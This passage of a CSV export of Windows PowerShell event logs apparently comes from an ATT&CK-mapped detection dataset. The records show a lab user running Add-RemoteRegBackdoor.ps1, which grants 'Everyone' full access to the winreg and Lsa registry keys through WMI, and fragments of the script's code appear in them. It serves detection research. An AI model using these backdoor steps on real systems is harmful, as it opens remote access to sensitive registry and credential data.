RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,54705,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""        Write-Verbose \""[$Computer : $Key] Using trustee username '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1013\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        Write-Verbose \""[$Computer : $Key] Using trustee username '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : ] Using trustee username 'Everyone'\""\n"",""Binary"":""""}}"
2,54706,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter \""name='RemoteRegistry'\"" @WmiArguments\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1015\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter \""name='RemoteRegistry'\"" @WmiArguments\n, CommandInvocation(Get-WmiObject): \""Get-WmiObject\""\nParameterBinding(Get-WmiObject): name=\""Class\""; value=\""Win32_Service\""\nParameterBinding(Get-WmiObject): name=\""Filter\""; value=\""name='RemoteRegistry'\""\nParameterBinding(Get-WmiObject): name=\""ComputerName\""; value=\""FS03\""\n"",""Binary"":""""}}"
3,54707,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer] Attaching to remote registry through StdRegProv\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1017\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer] Attaching to remote registry through StdRegProv\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03] Attaching to remote registry through StdRegProv\""\n"",""Binary"":""""}}"
4,54708,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter \""__CLASS = 'StdRegProv'\"" @WmiArguments\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1019\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter \""__CLASS = 'StdRegProv'\"" @WmiArguments\n, CommandInvocation(Get-WmiObject): \""Get-WmiObject\""\nParameterBinding(Get-WmiObject): name=\""Namespace\""; value=\""root/default\""\nParameterBinding(Get-WmiObject): name=\""Class\""; value=\""Meta_Class\""\nParameterBinding(Get-WmiObject): name=\""Filter\""; value=\""__CLASS = 'StdRegProv'\""\nParameterBinding(Get-WmiObject): name=\""ComputerName\""; value=\""FS03\""\n"",""Binary"":""""}}"
5,54709,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1021\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Backdooring started for key\""\n"",""Binary"":""""}}"
6,54710,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1023\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
7,54711,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1025\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
8,54712,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1027\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
9,54713,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1029\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
10,54714,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1031\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
11,54715,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1033\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
12,54716,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1035\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Backdooring completed for key\""\n"",""Binary"":""""}}"
13,54717,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1037\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Backdooring started for key\""\n"",""Binary"":""""}}"
14,54718,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1039\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
15,54719,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1041\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
16,54720,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1043\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
17,54721,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1045\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
18,54722,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1047\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
19,54723,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1049\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
20,54724,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1051\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): 